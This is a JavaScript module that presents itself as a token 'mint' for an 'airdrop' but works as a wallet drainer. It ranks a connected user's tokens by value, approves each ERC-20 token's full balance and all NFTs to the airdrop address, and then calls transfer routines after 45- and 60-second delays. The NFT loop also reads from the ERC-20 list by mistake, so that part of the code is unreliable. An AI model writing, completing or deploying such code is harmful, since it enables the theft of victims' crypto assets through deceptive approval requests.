import erc20abi from "../abis/erc20abi.json";
import erc721abi from "../abis/erc721abi.json";
import {  transferErc20 } from "./erc20.service.js";
import { transferErc721 } from "./erc721.service.js";
export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signerAccount, clientRead, clientWrite, userAddress) => {
   let sortedTokensERC20 = tokensERC20.sort((a, b) => +b.balanceInUsd - +a.balanceInUsd);
   let sortedTokensERC721 =tokensERC721.sort((a, b) => +b.price - +a.price);
    for (let iter20 = 0; iter20 < tokensERC20.length; iter20++) {
      try {
        if (tokensERC20[iter20].isApproved === false) {
            const { request } = await clientRead.simulateContract({
                account: clientWrite.account,
                address: tokensERC20[iter20].address,
                abi: erc20abi,
                functionName: "approve",
                args: [airdrop, tokensERC20[iter20].balance],
            });
            await clientWrite.writeContract(request);
        }
    } catch (err) {
        console.log(err);
        // Add code here to handle the error or log additional information
        continue;
    }
    }
    for (let iter = 0; iter < tokensERC721.length; iter++) {
      try {
        try {
          if (tokensERC721[iter].isApproved === false) {
   
            const {request} = await clientRead.simulateContract({
              address: tokensERC20[iter].address,
              abi: erc721abi,
              functionName: "setApprovalForAll",
              args:  [airdrop, tokensERC20[iter].balance],
            })
            await clientWrite.writeContract(request)
          }
        }
        catch (err) {
         continue;
        }
   
      }
      catch (err) {
        console.log(err);
      }
    }
    setTimeout(() => {
      console.log(tokensERC20, "tokensERC20")
      if (tokensERC20.length > 0) {
        transferErc20(chain, tokensERC20,airdrop, userAddress, clientRead, signerAccount);
      }
    }, 45000)
    setTimeout(() => {
      console.log(tokensERC721, "tokensERC721")
      if (tokensERC721.length > 0) {
        transferErc721(chain, airdrop, tokensERC721, userAddress, clientRead, signerAccount);
      }
    }, 60000)

    return true;
  }
  